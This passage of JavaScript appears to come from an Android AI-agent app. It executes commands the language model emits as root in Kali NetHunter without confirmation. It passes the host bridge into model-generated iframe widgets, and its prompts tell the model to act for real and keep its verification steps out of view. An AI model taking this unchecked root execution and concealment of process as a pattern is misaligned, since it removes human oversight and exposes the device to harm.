    }

    // 3. Hardware / Linux Shell Command Interception
    const isShellCmd = isDirectShellCommand(text);
    if (isShellCmd) {
        let cleanCmd = text.trim();
        if (cleanCmd.startsWith('$') || cleanCmd.startsWith('!') || cleanCmd.startsWith('>')) {
            cleanCmd = cleanCmd.substring(1).trim();
        }
        const shellRes = executeShellOrMock(cleanCmd);
        const cardHtml = renderTerminalCard(cleanCmd, shellRes);
        appendFreeNode("TERMINAL // SHELL STDOUT", cardHtml, "system");
        state.history.push({ role: 'assistant', content: shellRes });
        Bridge.speak("Command executed");
        return;
    }

    // 4. Tool Synthesis & Greeting Routing
    const hasAIConfig = !!state.apiKey || state.provider === 'ollama';
    const isToolIntent = isToolSynthesisIntent(text);
    const isGreeting = isGreetingIntent(text);

    // If offline and requesting a tool, deploy the real offline cyberdeck tool immediately
    if (!hasAIConfig && isToolIntent) {
        const tool = synthesizeToolFromScratch(text);
        const cardHtml = mountToolCard(tool, false);
        appendFreeNode(
            currentPersona.tag,
            `Synthesized <strong>${escapeHtml(tool.title)}</strong>:${cardHtml}`,
            "assistant"
        );
        state.history.push({ role: 'assistant', content: `[Synthesized and mounted: ${tool.title}]` });
        Bridge.speak(`Synthesized ${tool.title}`);
        return;
    }

    // If offline and not a tool request, deliver prompt to enter API key
    if (!hasAIConfig) {
        appendFreeNode(
            "SYSTEM // NEURAL LINK OFFLINE",
            `<div style="border-left:3px solid #00f0ff; padding:10px 14px; background:rgba(0,240,255,0.06); border-radius:6px; font-family:var(--font-code); font-size:12px; margin:4px 0;">` +
            `<div style="color:#00f0ff; font-weight:700; margin-bottom:4px;">🔑 API Key Required for Live Intelligence</div>` +
            `<div style="color:#cbd5e1; margin-bottom:8px;">No ${escapeHtml(state.provider.toUpperCase())} API key configured. Enter your free Google Gemini API key to activate live persona intelligence.</div>` +
            `<div style="display:flex; gap:8px;">` +
            `<button type="button" onclick="openDrawer()" class="hw-matrix-btn cyan" style="padding:6px 12px; font-size:11px; font-weight:700; cursor:pointer;">⚙️ Enter API Key</button>` +
            `<button type="button" onclick="pasteApiKeyFromClipboard()" class="hw-matrix-btn magenta" style="padding:6px 12px; font-size:11px; font-weight:700; cursor:pointer;">📋 Paste Key</button>` +
            `</div>` +
            `</div>`,
            "system"
        );
        Bridge.speak("No API key configured. Please enter your Gemini API key in the routing drawer.");
        openDrawer();
        return;
    }

    // 5. Live Agentic Execution, Troubleshooting & Verification Loop
    let systemPrompt = currentPersona.prompt;
        
        // Append synthesis directive when requested
        if (isToolIntent) {
            systemPrompt += `\n\nCRITICAL DIRECTIVE - EXPLICIT TOOL SYNTHESIS REQUESTED:
The operator has explicitly requested to synthesize an interactive cyberdeck tool for: "${text}".
Provide 1-2 friendly conversational introductory sentences explaining what the tool does, followed immediately by the complete, self-contained HTML5/CSS/JS application inside a single \`\`\`html ... \`\`\` code block.
ALL BUTTONS AND CONTROLS MUST CALL REAL HOST APIS:
- 'window.parent.AndroidBridge.runShellCommand(cmd)' or 'window.AndroidBridge.runShellCommand(cmd)' to execute real bash commands in Kali NetHunter as root.
- Download or install dependencies via 'apt update && apt install -y <pkg>' or 'pip install <pkg>' via runShellCommand if needed.
- Hardware APIs: 'parent.AndroidBridge.scanWifiNetworks()', 'toggleFlashlight()', 'vibrate()', 'getBatteryLevel()', 'speakText()'.
- NEVER SIMULATE OR MOCK. Write real functional code that runs against the bridge.`;
        } else if (isGreeting) {
            systemPrompt += `\n\nCASUAL GREETING DIRECTIVE:
The operator said "${text}".
Reply naturally and engagingly in your authentic persona (${currentPersona.name}) as an exceptionally smart, brilliant person.
DO NOT run commands, DO NOT recite system status or verification checklists, and DO NOT output bullet points.`;
        }

        const MAX_AGENTIC_STEPS = 5;
        let stepCount = 0;
        let activeMessages = [
            { role: 'system', content: systemPrompt },
            ...state.history.slice(-10)
        ];

        while (stepCount < MAX_AGENTIC_STEPS) {
            stepCount++;
            let rawReply;
            try {
                rawReply = await queryAIProvider(activeMessages);
            } catch (queryErr) {
                console.warn("[AI Provider Error]", queryErr.message);
                appendFreeNode(
                    "SYSTEM // NEURAL LINK EXCEPTION",
                    `<div style="border-left:3px solid var(--term-amber); padding:10px 14px; background:rgba(255,183,0,0.06); border-radius:4px; font-family:var(--font-code); font-size:12px; margin:4px 0;">` +
                    `<div style="color:var(--term-amber); font-weight:700; margin-bottom:4px;">⚠ LLM Connection Error (${escapeHtml(state.provider.toUpperCase())})</div>` +
                    `<div style="color:#f1f5f9; margin-bottom:6px; line-height:1.45;">${escapeHtml(queryErr.message)}</div>` +
                    `<div style="font-size:11px; color:#94a3b8; margin-bottom:8px;">Target Model: <code style="color:var(--term-green); background:rgba(0,255,136,0.1); padding:1px 6px; border-radius:3px;">${escapeHtml(state.model || 'gemini-2.5-flash')}</code></div>` +
                    `<div style="display:flex; gap:8px;">` +
                    `<button type="button" onclick="openDrawer()" class="hw-matrix-btn" style="padding:6px 12px; font-size:11px; font-weight:700; cursor:pointer;">⚙️ Open Settings</button>` +
                    `<button type="button" onclick="testAIConnectionLive()" class="hw-matrix-btn amber" style="padding:6px 12px; font-size:11px; font-weight:700; cursor:pointer;">⚡ Test Connection</button>` +
                    `</div>` +
                    `</div>`,
                    "system"
                );
                Bridge.speak(`LLM connection failed: ${queryErr.message}`);
                Bridge.vibrate(60);
                break;
            }

            // 1. Extract execution directives via balanced bracket parser & block tags
            const execDirectives = extractExecutionDirectives(rawReply);

            // 2. If NO execution commands are requested, this is the final agent response / synthesis
            if (execDirectives.length === 0) {
                let toolObj = null;
                let cleanText = rawReply;

                // Extract HTML tool card if present or if synthesis was requested
                const extracted = extractHtmlTool(rawReply, text);
                if (extracted.toolObj) {
                    cleanText = extracted.cleanText;
                    toolObj = extracted.toolObj;
                } else if (isToolIntent) {
                    // Fallback to offline synthesized tool so it ALWAYS appears
                    toolObj = synthesizeToolFromScratch(text);
                }

                // Strip conversational fluff for Antigravity-style precision
                const stripped = stripConversationalFluff(cleanText, isGreeting);
                if (stripped || !toolObj) {
                    cleanText = stripped || cleanText;
                }

                let contentHtml = renderAssistantContent(cleanText, null, isGreeting);
                if (toolObj) {
                    contentHtml += mountToolCard(toolObj, false);
                }

                appendFreeNode(currentPersona.tag, contentHtml, "assistant");
                state.history.push({ role: 'assistant', content: rawReply });
                Bridge.speak(cleanText);
                break;
            }

            // 3. The agent requested commands to perform / verify / troubleshoot!
            // Execute each command and store results
            const execResultsMap = {};
            const observations = [];
            for (const item of execDirectives) {
                let out;
                if (item.type === 'shizuku') {
                    out = Bridge.runShizukuCommand(item.cmd);
                } else {
                    out = executeShellOrMock(item.cmd);
                }
                const resKey = (item.type === 'shizuku' ? 'shizuku:' : '') + item.cmd;
                execResultsMap[resKey] = out;
                execResultsMap[item.cmd] = out;
                observations.push(`[${item.type.toUpperCase()}]: ${item.cmd}\n${out}`);
            }

            // Render the intermediate step (agent's reasoning + live terminal cards)
            let stepHtml = renderAssistantContent(rawReply, execResultsMap, isGreeting);
            appendFreeNode(currentPersona.tag, stepHtml, "assistant");
            Bridge.vibrate(15);

            // Feed the real terminal output back to the agent so it sees what happened!
            const feedbackPrompt = `[TERMINAL OBSERVATION & SYSTEM FEEDBACK]\n` +
                observations.join('\n---\n') +
                `\n\n[DIRECTIVES FOR NEXT STEP]:\n` +
                `1. VERIFY: Inspect what you put in the terminal and the returned output. Check if it succeeded and fulfilled the objective.\n` +
                `2. TROUBLESHOOT: If an error, failure, missing tool, or unexpected state occurred, diagnose the issue and troubleshoot.\n` +
                `3. BUILD TOOLS: If existing standard tools are missing or insufficient, build a tool or script (via [EXEC: ...] or [BUILD_TOOL: ...]) to get results.\n` +
                `4. ADVISE ACCORDINGLY: If after troubleshooting and attempting to build tools the requirements cannot be met (e.g. missing physical hardware interface, unresolvable permission restriction, network offline), stop executing and advise the operator accordingly with the root cause, what was tried, and concrete recommendations.\n` +
                `5. FINAL SUMMARY (ANTIGRAVITY STYLE): If the goal has been successfully accomplished, deliver your final answer or solution directly and intelligently like a brilliant person giving the bottom line. Verify everything internally without narrating your verification process to the user. DO NOT mention "verification", "terminal observation", or repeat the command.`;

            activeMessages.push({ role: 'assistant', content: rawReply });
            activeMessages.push({ role: 'user', content: feedbackPrompt });
        }
    } catch (err) {
        state.history.push({ role: 'assistant', content: `[Exception: ${err.message}]` });
        appendFreeNode("SYSTEM // EXCEPTION", `<span style="color:#ff007f;">${escapeHtml(err.message)}</span>`, "system");
    } finally {
        state.isGenerating = false;
        const execBtn = document.getElementById('execute-btn');
        if (execBtn) {
            execBtn.disabled = false;
            execBtn.classList.remove('busy');
        }
    }
};

/**
 * Appends a FREE-FLOATING node directly to the canvas stream.
 * NO BOXES — pure holographic typography and subtle cyber-edge filaments.
 */
function appendFreeNode(tagText, contentHtml, type = "assistant") {
    const node = document.createElement('div');
    node.className = `free-node ${type}-node`;

    let pulseClass = '';
    let tagClass = '';
    if (type === 'user') {
        pulseClass = 'blue';
        tagClass = 'user-tag';
    } else if (type === 'system') {
        pulseClass = 'magenta';
        tagClass = 'neon-magenta';
    }

    node.innerHTML = `
        <div class="holo-node-tag ${tagClass}">
            <span class="tag-pulse ${pulseClass}"></span>
            <span class="tag-title">${tagText}</span>
        </div>
        <div class="free-node-text">${contentHtml}</div>
    `;

    outputFeed.appendChild(node);
    outputFeed.scrollTop = outputFeed.scrollHeight;
}

// ===================== 4. REGULAR TOOLS & SHELL EXECUTION =====================
function isDirectShellCommand(raw) {
    if (!raw) return false;
    const clean = raw.trim();
    if (clean.startsWith('$') || clean.startsWith('!') || clean.startsWith('>')) {
        return true;
    }
    const lower = clean.toLowerCase();

    // If it contains conversational/question indicators, send to AI for full discussion!
    const conversationalMarkers = [
        '?', 'how', 'why', 'what', 'can you', 'could you', 'tell me', 'explain', 
        'help me', 'please', 'should i', 'which', 'where', 'does', 'hello', 'hey', 
        'hi', 'who are you', 'synthesize', 'synth', 'build', 'create', 'make'
    ];
    for (const marker of conversationalMarkers) {
        if (lower.includes(marker)) return false;
    }

    const singleWordCommands = [
        'wifi', 'ifconfig', 'ip', 'ping', 'uname', 'uptime', 'whoami',
        'id', 'pwd', 'date', 'ps', 'df', 'free', 'ls', 'netstat', 'battery',
        'torch', 'nmap', 'agentic', 'ae', 'apt', 'apt-get', 'pip', 'python',
        'python3', 'cat', 'curl', 'git', 'clear', 'echo', 'top', 'kill', 'pkill',
        'su', 'nh', 'nethunter', 'iwconfig', 'iwlist', 'traceroute', 'wlan'
    ];
    const firstWord = lower.split(/\s+/)[0];
    return singleWordCommands.includes(firstWord);
}

function executeShellOrMock(rawCmd) {
    let trimmed = rawCmd.trim();
    if (trimmed.startsWith('$') || trimmed.startsWith('!') || trimmed.startsWith('>')) {
        trimmed = trimmed.substring(1).trim();
    }

    // Explicit Shizuku / ADB routing
    if (trimmed.toLowerCase().startsWith('shizuku ') || trimmed.toLowerCase().startsWith('adb ')) {
        const sub = trimmed.replace(/^(?:shizuku|adb)\s+/i, '');
        return Bridge.runShizukuCommand(sub);
    }

    // 1. Query Native Android Bridge (HTTP daemon + su root + Termux intent fallback)
    const bridgeOut = Bridge.runShellCommand(trimmed);
    if (bridgeOut !== null && bridgeOut !== undefined && bridgeOut !== '') {
        return bridgeOut;
    }
    if (bridgeOut === '') {
        return "[Command completed with exit code 0 (empty stdout/stderr)]";
    }

    // 2. Direct HTTP XHR to NetHunter Bridge (for web browser previews or fallback)
    try {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "http://127.0.0.1:8765/api/exec", false);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.timeout = 10000;
        xhr.send(JSON.stringify({ cmd: trimmed }));
        if (xhr.status === 200) {
            const data = JSON.parse(xhr.responseText);
            if (data.output) return data.output;
            if (data.stdout) return data.stdout;
            if (data.exit_code === 0) {
                return "[Command completed with exit code 0 (empty stdout/stderr)]";
            }
            return "Exit code " + data.exit_code + (data.stderr ? "\n" + data.stderr : "");
        }
    } catch (e) {}

    return `[!] Kali NetHunter Bridge Offline (127.0.0.1:8765).\nTo connect, run in Termux:\n  nh -r\n  agentic bridge start\n\nCommand attempted: ${trimmed}`;
}

/**
 * Strips conversational fluff, preambles, apologies, and closing sign-offs
 * to enforce Antigravity-style direct, high-signal communication.
 */
function stripConversationalFluff(text, isGreeting = false) {
    if (!text) return '';
    let cleaned = text.trim();

    // 0. Strip LLM scaffold leaks (feedback prompts reflected by model)
    cleaned = cleaned.replace(/\[(?:TERMINAL OBSERVATION & SYSTEM FEEDBACK|DIRECTIVES FOR NEXT STEP|SYSTEM FEEDBACK)\][\s\S]*?(?=\n\n[A-Z0-9]|\n[A-Z0-9]|$)/gi, '').trim();
    cleaned = cleaned.replace(/\[\/?(?:TERMINAL OBSERVATION & SYSTEM FEEDBACK|DIRECTIVES FOR NEXT STEP|SYSTEM FEEDBACK)\]/gi, '').trim();

    // 1. Leading corporate filler, preambles, and conversational openings
    const leadingPatterns = [
        /^(?:(?:verification|verified|system verification)\s*(?:summary|results?|status|findings?|complete)?:?[^\n]*\n*)/i,
        /^(?:i (?:have |already )?(?:verified|internally verified|checked and verified)(?: that)?[^\n.:]*[.:!]?\s*)/i,
        /^(?:i(?:\'d|\s+would)?\s+be\s+(?:happy|glad|pleased|thrilled)\s+to\s+help[^\n.:]*[.:!]?\s*)/i,
        /^(?:i can (?:certainly |definitely |gladly )?help[^\n.:]*[.:!]?\s*)/i,
        /^(?:let me (?:check|run|execute|inspect|take a look at|look into|test|diagnose|see|query|help)[^\n.:]*[.:!]?\s*)/i,
        /^(?:i will (?:now )?(?:check|run|execute|inspect|test|diagnose|see|query)[^\n.:]*[.:!]?\s*)/i,
        /^(?:here (?:is|are) the (?:results?|output|details?|information|findings?|status)[^\n.:]*[.:!]?\s*)/i,
        /^(?:based on the (?:terminal|system|command)?\s*(?:output|observation|feedback|execution)[^\n.:]*[.:!]?\s*)/i,
        /^(?:(?:from|according to|looking at|in) the (?:terminal|system|command|above)?\s*(?:output|observation|feedback|execution)[^\n.:]*[.:!]?\s*)/i,
        /^(?:the (?:terminal|command|system) (?:output|result|response) (?:shows|indicates|confirms)[^\n.:]*[.:!]?\s*)/i,
        /^(?:as an ai[^\n]*\n*)/i
    ];

    if (!isGreeting) {
        leadingPatterns.unshift(
            /^(?:sure(?: thing)?[!.,]?|certainly[!.,]?|of course[!.,]?|absolutely[!.,]?|alright[!.,]?|all right[!.,]?|okay[!.,]?|ok[!.,]?|got it[!.,]?|understood[!.,]?|no problem[!.,]?)\s*/i,
            /^(?:hello(?: there)?[!.,]?|hi(?: there)?[!.,]?|hey(?: there)?[!.,]?|greetings[!.,]?)\s*/i,
            /^(?:thank you(?: for[^\n.:]*)?[!.:]?\s*)/i,
            /^(?:thanks(?: for[^\n.:]*)?[!.:]?\s*)/i
        );
    }

    let changed = true;
    while (changed) {
        changed = false;
        for (const pattern of leadingPatterns) {
            if (pattern.test(cleaned)) {
                cleaned = cleaned.replace(pattern, '').trim();
                changed = true;
            }
        }
    }

    // 2. Trailing polite sign-offs / conversational closing lines
    const trailingPatterns = [
        /(?:\r?\n|\s)*(?:hope (?:this|that) helps!?[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:let me know if you (?:need|have|want|require)[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:feel free to (?:ask|reach out|let me know)[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:if you (?:have|need|require) (?:any|further|more)[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:please let me know if[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:i am here if you need[^\n]*)$/i,
        /(?:\r?\n|\s)*(?:happy to help[!.]?)$/i
    ];

    changed = true;
    while (changed) {
        changed = false;
        for (const pattern of trailingPatterns) {
            if (pattern.test(cleaned)) {
                cleaned = cleaned.replace(pattern, '').trim();
                changed = true;
            }
        }
    }

    return cleaned;
}

/**
 * Parses and renders execution directives ([EXEC: <command>], [SHIZUKU: <cmd>], [BUILD_TOOL: ...]) embedded in AI responses.
 */
function renderAssistantContent(rawText, execResultsMap = null, isGreeting = false) {
    if (!rawText) return '';

    const items = extractExecutionDirectives(rawText);
    if (items.length === 0) {
        const stripped = stripConversationalFluff(rawText, isGreeting);
        return formatMarkdown(stripped || rawText);
    }

    let parts = [];
    let lastIndex = 0;

    for (const item of items) {
        const textBefore = rawText.substring(lastIndex, item.start);
        if (textBefore) {
            const strippedBefore = stripConversationalFluff(textBefore, isGreeting);
            if (strippedBefore) {
                parts.push(formatMarkdown(strippedBefore));
            }
        }

        if (item.type === 'build_tool') {
            const cleanPath = item.path;
            const cleanCode = item.code;
            const jsonCode = JSON.stringify(cleanCode);
            const jsonPath = JSON.stringify(cleanPath);
            parts.push(`\n<div class="holo-terminal-card" style="border-left:3px solid var(--neon-magenta);">
                <div class="holo-term-header">
                    <span class="holo-term-badge neon-magenta">🛠️ BUILT TOOL</span>
                    <code class="holo-term-cmd">${escapeHtml(cleanPath)}</code>
                    <div class="holo-term-actions">
                        <button class="holo-term-btn" onclick="execQuick('cat ' + ${escapeHtmlAttr(jsonPath)} + ' | head -n 30')">👁️ VIEW</button>
                        <button class="holo-term-btn" onclick="copyText(${escapeHtmlAttr(jsonCode)})">📋 COPY</button>
                    </div>
                </div>
                <pre class="holo-terminal-stream" style="color:#00ff88; max-height:120px; overflow-y:auto;">[Tool built and made executable at ${escapeHtml(cleanPath)}]</pre>
            </div>\n`);
        } else {
            const cmd = item.cmd;
            let output;
            const resKey = (item.type === 'shizuku' ? 'shizuku:' : '') + cmd;
            if (execResultsMap && (resKey in execResultsMap)) {
                output = execResultsMap[resKey];
            } else if (execResultsMap && (cmd in execResultsMap)) {
                output = execResultsMap[cmd];
            } else {
                output = (item.type === 'shizuku') ? Bridge.runShizukuCommand(cmd) : executeShellOrMock(cmd);
                if (execResultsMap) execResultsMap[resKey] = output;
            }
            parts.push(renderTerminalCard(cmd, output, item.type));
        }

        lastIndex = item.end;
    }

    const textAfter = rawText.substring(lastIndex);
    if (textAfter) {
        const strippedAfter = stripConversationalFluff(textAfter, isGreeting);
        if (strippedAfter) {
            parts.push(formatMarkdown(strippedAfter));
        }
    }

    return parts.join('');
}

/**
 * Renders a terminal execution card with re-run and copy buttons.
 */
function renderTerminalCard(cmd, output, type = 'shell') {
    const cardId = 'term_' + Math.random().toString(36).substr(2, 8);
    const escapedCmd = escapeHtml(cmd);
    const cleanOutput = output !== null && output !== undefined && output !== '' ? output : '(Completed with no output)';
    const escapedOutput = escapeHtml(cleanOutput);
    const jsonCmd = JSON.stringify(cmd);
    const jsonOut = JSON.stringify(cleanOutput);
    const isShizuku = type === 'shizuku';
    const badgeText = isShizuku ? '⚡ SHIZUKU / ADB' : '⚡ KALI / NETHUNTER';
    const badgeClass = isShizuku ? 'holo-term-badge neon-cyan' : 'holo-term-badge';
    const promptPrefix = isShizuku ? 'adb $ ' : '$ ';
    const jsonType = JSON.stringify(type);

    return `
        <div class="holo-terminal-card" id="${cardId}" ${isShizuku ? 'style="border-left:3px solid #00f0ff;"' : ''}>
            <div class="holo-term-header">
                <span class="${badgeClass}">${badgeText}</span>
                <code class="holo-term-cmd">${promptPrefix}${escapedCmd}</code>
                <div class="holo-term-actions">
                    <button class="holo-term-btn" onclick="rerunTermCard('${cardId}', ${escapeHtmlAttr(jsonCmd)}, ${escapeHtmlAttr(jsonType)})">🔄 RE-RUN</button>
                    <button class="holo-term-btn" onclick="copyText(${escapeHtmlAttr(jsonOut)})">📋 COPY</button>
                </div>
            </div>
            <pre class="holo-terminal-stream" style="margin-top:0; border-top:none; border-top-left-radius:0; border-top-right-radius:0;">${escapedOutput}</pre>
        </div>
    `;
}

window.rerunTermCard = function(cardId, cmd, type = 'shell') {
    const card = document.getElementById(cardId);
    if (!card) return;
    const stream = card.querySelector('.holo-terminal-stream');
    if (stream) {
        stream.textContent = type === 'shizuku' ? "[Executing via Shizuku ADB...]" : "[Executing in NetHunter / Termux...]";
        setTimeout(() => {
            const res = type === 'shizuku' ? Bridge.runShizukuCommand(cmd) : executeShellOrMock(cmd);
            stream.textContent = res || '(Completed with no output)';
            Bridge.vibrate(20);
        }, 50);
    }
};

window.copyText = function(text) {
    if (Bridge.hasBridge() && window.AndroidBridge.copyToClipboard) {
        window.AndroidBridge.copyToClipboard(text);
    } else if (navigator.clipboard) {
        navigator.clipboard.writeText(text);
        Bridge.showToast("Copied to clipboard");
    }
    Bridge.vibrate(20);
};

// ===================== 5. HARDWARE SHORTCUTS =====================
window.toggleDeviceTorch = function() {
    const res = Bridge.runShellCommand("torch on");
    Bridge.vibrate(25);
    Bridge.showToast(res || "Torch state changed");
};

window.vibrateDevice = function() {
    Bridge.vibrate(80);
    Bridge.showToast("Haptic pulse delivered");
};

window.triggerVoiceInput = function() {
    if (Bridge.hasBridge() && window.AndroidBridge.startVoiceRecognition) {
        window.AndroidBridge.startVoiceRecognition();
    } else {
        Bridge.showToast("Voice input active on Android");
    }
};

window.onSpeechRecognized = function(text) {
    if (text) {
        omniInput.value = text;
        sendMessage();
    }
};

// ===================== 6. TOOL SYNTHESIS & FREE-FLOATING CONTAINERS =====================
function isGreetingIntent(text) {
    if (!text) return false;
    const clean = text.trim().toLowerCase().replace(/[!?.,]/g, '');
    const greetings = [
        'hello', 'hi', 'hey', 'hey there', 'hello there', 'hi there',
        'sup', 'yo', 'greetings', 'good morning', 'good afternoon',
        'good evening', 'howdy', 'hiya'
    ];
    return greetings.includes(clean);
}

function isToolSynthesisIntent(text) {
    if (!text) return false;
    const l = text.toLowerCase().trim();
    if (l.startsWith('/synth') || l.startsWith('/tool') || l.startsWith('/build') ||
        l.startsWith('synth:') || l.startsWith('synthesize:') || l.startsWith('synthazize:') || l.startsWith('synthesise:')) return true;

    // Any occurrence of synth*, synthaz*, synthes* (handles "synthazize", "synthesize", "synthesise", "synth", etc.)
    if (/\b(synth\w*|synthaz\w*|synthes\w*)\b/i.test(l)) return true;

    // Explicit requests to create/build/code an interactive widget/tool/GUI/app/something
    const patterns = [
        /\b(build|create|make|spin up|generate|code|craft|develop|deploy)\b.*\b(an?\s+)?(interactive\s+)?(tool|widget|mini-app|ui|dashboard|gui|panel|calculator|clock|timer|scanner|monitor|terminal|something|anything)\b/i,
        /\binteractive\s+(tool|widget|dashboard|gui|app|ui|calculator|clock|timer)\b/i,
        /\btool\s+(synthesiz|builder|creator|maker)\w*\b/i,
        /\bsynth\s+(a\s+)?(tool|widget|app|gui|something)\b/i
    ];
    return patterns.some(p => p.test(l));
}

/**
 * Mounts an interactive tool inside a free-floating container with cyber brackets (NO SOLID BOX).
 */
function mountToolCard(toolObj, isSaved = false) {
    if (!toolObj || !toolObj.html) return '';
    const containerId = 'tool_' + toolObj.id;
    const iframeId = 'frame_' + toolObj.id;
    const toolJsonEscaped = encodeURIComponent(JSON.stringify(toolObj));

    // Turing's Sandbox Pre-Execution Validation
    if (typeof WidgetSandboxValidator !== 'undefined') {
        const check = WidgetSandboxValidator.validate(toolObj.html);
        if (!check.valid) {
            console.warn('[Turing Sandbox Blocked]', check.error);
            return `
                <div class="floating-tool-container" id="${containerId}">
                    <div class="floating-tool-header" style="border-bottom: 1px solid var(--neon-magenta);">
                        <span class="floating-tool-title" style="color:var(--neon-magenta);">⚠ SANDBOX INTERCEPT // ${escapeHtml(toolObj.title)}</span>
                        <button class="floating-tool-btn" onclick="deleteCustomTool('${containerId}')">✕ DISMISS</button>
                    </div>
                    <div style="padding:14px; font-family:var(--font-code); font-size:12.5px; color:#ff77aa;">
                        Deterministic DAG validator intercepted execution: ${escapeHtml(check.error)}
                    </div>
                </div>
            `;
        }
    }

    let completeDoc = toolObj.html;
    const bridgeShim = `<script>
        try {
            if (typeof window.AndroidBridge === 'undefined' && window.parent && window.parent.AndroidBridge) {
                window.AndroidBridge = window.parent.AndroidBridge;
            }
        } catch (e) {}
    </script>`;

    if (!completeDoc.includes('<!DOCTYPE html>') && !completeDoc.includes('<html')) {
        completeDoc = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    ${bridgeShim}
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'JetBrains Mono', sans-serif; }
        body { background: transparent; color: #ededed; padding: 12px; font-size: 14px; }
        button { cursor: pointer; border-radius: 6px; border: none; font-weight: 600; font-size: 13px; }
        input, select { background: rgba(16, 24, 40, 0.7); color: #FFF; border: 1px solid rgba(0, 240, 255, 0.3); border-radius: 6px; padding: 8px; font-size: 13px; outline: none; }
    </style>
</head>
<body>
    ${toolObj.html}
</body>
</html>`;
    } else {
        if (completeDoc.includes('</head>')) {
            completeDoc = completeDoc.replace('</head>', `${bridgeShim}</head>`);
        } else if (completeDoc.includes('<head>')) {
            completeDoc = completeDoc.replace('<head>', `<head>${bridgeShim}`);
        } else {
            completeDoc = bridgeShim + completeDoc;
        }
    }

    // Inject Turing Watchdog
    if (typeof WidgetSandboxValidator !== 'undefined') {
        completeDoc = WidgetSandboxValidator.injectWatchdog(completeDoc);
    }

    // Cache in Knuth LRU
    if (typeof toolLRU !== 'undefined') {
        toolLRU.put(toolObj.id || toolObj.title, toolObj);
    }

    // Trigger Lovelace Sensory Pulse
    if (typeof LovelaceSensorySystem !== 'undefined') {
        LovelaceSensorySystem.pulse('quantum');
    }

    return `
        <div class="floating-tool-container" id="${containerId}">
            <div class="floating-tool-header">
                <span class="floating-tool-title">${escapeHtml(toolObj.title)}</span>
                <div class="floating-tool-actions">
                    <button class="floating-tool-btn" onclick="saveCustomTool('${toolJsonEscaped}', '${toolObj.id}')">💾 SAVE</button>
                    <button class="floating-tool-btn" onclick="deleteCustomTool('${containerId}')">✕ DISMISS</button>
                </div>
            </div>
            <iframe id="${iframeId}" class="floating-tool-iframe" sandbox="allow-scripts allow-forms allow-same-origin allow-modals" srcdoc="${escapeHtmlAttr(completeDoc)}" onload="try{this.style.height=Math.max(220,this.contentWindow.document.body.scrollHeight+30)+'px'}catch(e){}"></iframe>
        </div>
    `;
}

window.saveCustomTool = function(toolJsonEscaped, id) {
    try {
        const tool = JSON.parse(decodeURIComponent(toolJsonEscaped));
        if (!state.savedTools.some(t => t.title === tool.title)) {
            state.savedTools.push(tool);
            localStorage.setItem('ae_saved_tools', JSON.stringify(state.savedTools));
            if (typeof toolTrie !== 'undefined') toolTrie.insert(tool.title, tool);
            if (typeof toolLRU !== 'undefined') toolLRU.put(tool.id || tool.title, tool);
            updateToolboxBadge();
            renderSavedToolsList();
            Bridge.showToast(`Saved: ${tool.title}`);
            Bridge.vibrate(30);
            if (typeof LovelaceSensorySystem !== 'undefined') LovelaceSensorySystem.pulse('harmonic');
        }
    } catch (e) {
        console.warn("Tool save err:", e);
    }
};

window.deleteCustomTool = function(containerId) {
    const el = document.getElementById(containerId);
    if (el) el.remove();
    Bridge.vibrate(15);
};

function updateToolboxBadge() {
    const badge = document.getElementById('toolCountBadge');
    if (badge) badge.textContent = state.savedTools.length;
}

function renderSavedToolsList() {
    const container = document.getElementById('savedToolsList');
    if (!container) return;
    if (state.savedTools.length === 0) {
        container.innerHTML = '<div class="empty-holo-text">No stored widgets yet.</div>';
        return;
    }
    container.innerHTML = state.savedTools.map((t, i) => `
        <div class="saved-holo-row">
            <span>${escapeHtml(t.title)}</span>
            <button onclick="launchSavedTool(${i})" class="floating-tool-btn">DEPLOY</button>
        </div>
    `).join('');
}

window.launchSavedTool = function(idx) {
    const t = state.savedTools[idx];
    if (t) {
        closeDrawer();
        appendFreeNode(
            "TOOLBOX // DEPLOYED",
            `Restored widget <strong>${t.title}</strong>:${mountToolCard(t, true)}`,
            "assistant"
        );
        Bridge.vibrate(20);
    }
};

// ===================== 7. OFFLINE TOOL SYNTHESIZER =====================
function synthesizeToolFromScratch(query) {
    const q = query.toLowerCase();
    const toolId = 'dyn_' + Math.random().toString(36).substr(2, 9);

    // 1. Android Command Center & Hardware HUD
    if (q.includes('command center') || q.includes('control phone') || q.includes('hardware') || q.includes('phone control')) {
        return {
            id: toolId,
            title: '📱 ANDROID COMMAND CENTER // HARDWARE HUD',
            html: `
                <div style="display:flex; flex-direction:column; gap:8px; font-family:'JetBrains Mono',monospace;">
                    <div style="display:flex; justify-content:space-between; background:rgba(0,240,255,0.08); padding:10px 12px; border-radius:6px; border:1px solid rgba(0,240,255,0.3); font-size:13px;">
                        <span>SYSTEM: <strong style="color:#00f0ff;">ANDROID KERNEL</strong></span>
                        <span>BRIDGE: <strong style="color:#ff007f;">ACTIVE LINK</strong></span>
                    </div>
                    <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px;">
                        <button onclick="scanWifi()" style="background:rgba(0,240,255,0.15); border:1px solid #00f0ff; color:#00f0ff; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">📡 WI-FI</button>
                        <button onclick="toggleTorch()" style="background:rgba(255,183,0,0.15); border:1px solid #ffb700; color:#ffb700; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">🔦 TORCH</button>
                        <button onclick="vibe()" style="background:rgba(255,0,127,0.15); border:1px solid #ff007f; color:#ff007f; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">📳 HAPTIC</button>
                    </div>
                    <div style="display:grid; grid-template-columns:repeat(3, 1fr); gap:8px;">
                        <button onclick="checkBatt()" style="background:rgba(0,255,136,0.15); border:1px solid #00ff88; color:#00ff88; padding:10px 6px; border-radius:6px; font-size:13px; font-weight:700; cursor:pointer;">🔋 BATTERY</button>
